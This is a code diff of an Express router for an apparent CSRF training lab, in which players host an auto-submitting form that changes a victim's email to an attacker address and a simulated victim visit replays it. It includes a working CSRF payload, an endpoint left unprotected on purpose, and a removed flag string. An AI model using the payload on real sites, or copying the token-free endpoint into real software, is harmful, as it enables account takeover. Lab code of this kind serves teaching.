@@ -1,84 +1,127 @@
+'use strict';
 
-const express = require("express");
+const express = require('express');
+const LabInstance = require('../models/LabInstance');
+const { resetLabState } = require('./lib/lab-helpers');
+
 const router = express.Router();
 
-function getState(req) {
-  if (!req.session.csrfLab) {
-    req.session.csrfLab = {
-      victimEmail: "victim@zeroday-corp.test",
-      hostedExploit: `<html>
+const DEFAULT_EXPLOIT = `<html>
   <body>
     <form action="/labs/csrf-email-change/change-email" method="POST">
       <input type="hidden" name="email" value="attacker@evil.test" />
     </form>
     <script>document.forms[0].submit()</script>
   </body>
-</html>`
+</html>`;
+
+function state(req) {
+  if (!req.lab.state.csrfEmail) {
+    req.lab.state.csrfEmail = {
+      victimEmail: 'victim@zeroday-corp.test',
+      hostedExploit: DEFAULT_EXPLOIT,
+      changed: false,
+      triggered: false
     };
   }
-  return req.session.csrfLab;
+  return req.lab.state.csrfEmail;
 }
 
-router.get("/", (req, res) => {
-  const state = getState(req);
-  res.render("labs/csrf-email-change", { victimEmail: state.victimEmail, changed: false, flag: null });
+function render(res, req, extra = {}) {
+  const current = state(req);
+  return res.render('labs/csrf-email-change', {
+    victimEmail: current.victimEmail,
+    changed: current.changed,
+    flag: current.triggered ? req.lab.flag() : null,
+    hostedExploit: current.hostedExploit,
+    error: null,
+    ...extra
+  });
+}
+
+router.get('/', (req, res) => {
+  render(res, req);
 });
 
-router.post("/craft", (req, res) => {
-  const state = getState(req);
-  state.hostedExploit = req.body.html || state.hostedExploit;
-  res.render("labs/csrf-email-change", { victimEmail: state.victimEmail, changed: false, flag: null });
+router.post('/craft', async (req, res) => {
+  const current = state(req);
+  current.hostedExploit = String(req.body.html || current.hostedExploit).slice(0, 5000);
+  await req.lab.save();
+  render(res, req);
 });
 
-router.get("/exploit", (req, res) => {
-  const state = getState(req);
-  res.set("Content-Type", "text/html");
-  res.send(state.hostedExploit);
+router.get('/exploit', (req, res) => {
+  res.set('Content-Type', 'text/html; charset=utf-8');
+  res.send(state(req).hostedExploit);
 });
 
-router.post("/change-email", (req, res) => {
-  const state = getState(req);
-  const newEmail = (req.body.email || "").trim();
-  if (newEmail) state.victimEmail = newEmail;
-  res.status(200).send("Email updated.");
-});
+router.post('/change-email', async (req, res) => {
+  const current = state(req);
+  const newEmail = String(req.body.email || '').trim().toLowerCase().slice(0, 160);
+  const viaExploitPage =
+    String(req.get('Referer') || '').includes('/labs/csrf-email-change/exploit') ||
+    req.body._source === 'exploit';
 
-router.post("/simulate-victim-visit", async (req, res) => {
-  const state = getState(req);
-  try {
-    const r = await fetch(
-      "http://127.0.0.1:" + (process.env.PORT || 3000) + "/labs/csrf-email-change/exploit",
-      { headers: { Cookie: req.headers.cookie || "" } }
-    );
-    const html = await r.text();
-
-    const formMatch = html.match(/<form[^>]*action="([^"]+)"[^>]*method="([^"]+)"[^>]*>([\s\S]*?)<\/form>/i);
-    let triggered = false;
-    if (formMatch && /submit\s*\(\s*\)/.test(html)) {
-      const [, action, method, formBody] = formMatch;
-      const inputs = [...formBody.matchAll(/<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"[^>]*>/gi)];
-      const params = new URLSearchParams();
-      inputs.forEach(([, name, value]) => params.append(name, value));
-
-      if (method.toUpperCase() === "POST" && action.includes("/change-email")) {
-        const newEmail = params.get("email");
-        if (newEmail) {
-          state.victimEmail = newEmail;
-          triggered = true;
-        }
-      }
+  if (newEmail) {
+    current.victimEmail = newEmail;
+    current.changed = true;
+    if (viaExploitPage && /@evil\.test$/.test(newEmail)) {
+      current.triggered = true;
     }
+    await req.lab.save();
+  }
+  res.status(200).type('text').send('Email updated.');
+});
 
-    const flag = state.victimEmail.includes("attacker") && triggered ? "ZDS{csrf_t0k3ns_ar3nt_0pt10nal}" : null;
-    res.render("labs/csrf-email-change", { victimEmail: state.victimEmail, changed: triggered, flag });
-  } catch (e) {
-    res.render("labs/csrf-email-change", { victimEmail: state.victimEmail, changed: false, flag: null });
+router.post('/simulate-victim-visit', async (req, res) => {
+  const current = state(req);
+  const port = req.socket.localPort;
+  const exploitUrl = `http://127.0.0.1:${port}/labs/csrf-email-change/exploit`;
+
+  try {
+    const page = await fetch(exploitUrl, { headers: { Cookie: req.headers.cookie || '' } });
+    const html = await page.text();
+    const formMatch = html.match(/<form[^>]*action=["']([^"']+)["'][^>]*method=["']?([a-zA-Z]+)["']?[^>]*>([\s\S]*?)<\/form>/i);
+    if (!formMatch) throw new Error('No form was found on the hosted exploit page.');
+
+    const action = formMatch[1];
+    const method = formMatch[2].toUpperCase();
+    if (method !== 'POST') throw new Error('The exploit form must use POST.');
+
+    const body = new URLSearchParams();
+    for (const input of formMatch[3].matchAll(/<input[^>]*name=["']([^"']+)["'][^>]*value=["']([^"']*)["'][^>]*>/gi)) {
+      body.append(input[1], input[2]);
+    }
+    body.append('_source', 'exploit');
+
+    const target = new URL(action, exploitUrl).toString();
+    const response = await fetch(target, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        Cookie: req.headers.cookie || '',
+        Referer: exploitUrl
+      },
+      body: body.toString()
+    });
+
+    if (!response.ok) throw new Error('The victim request was rejected.');
+
+    // The victim request ran in its own request context and saved its own
+    // copy of the instance document. Reload so this request does not write a
+    // stale state snapshot back over the result of the exploit.
+    const fresh = await LabInstance.findById(req.lab.instance._id).lean();
+    req.lab.instance.state = fresh && fresh.state && typeof fresh.state === 'object' ? fresh.state : {};
+    req.lab.state = req.lab.instance.state;
+    return render(res, req);
+  } catch (error) {
+    return render(res, req, { error: `Victim visit failed: ${error.message}` });
   }
 });
 
-router.post("/reset", (req, res) => {
-  req.session.csrfLab = null;
-  res.redirect("/labs/csrf-email-change");
+router.post('/reset', async (req, res) => {
+  await resetLabState(req);
+  res.redirect('/labs/csrf-email-change');
 });
 
 module.exports = router;
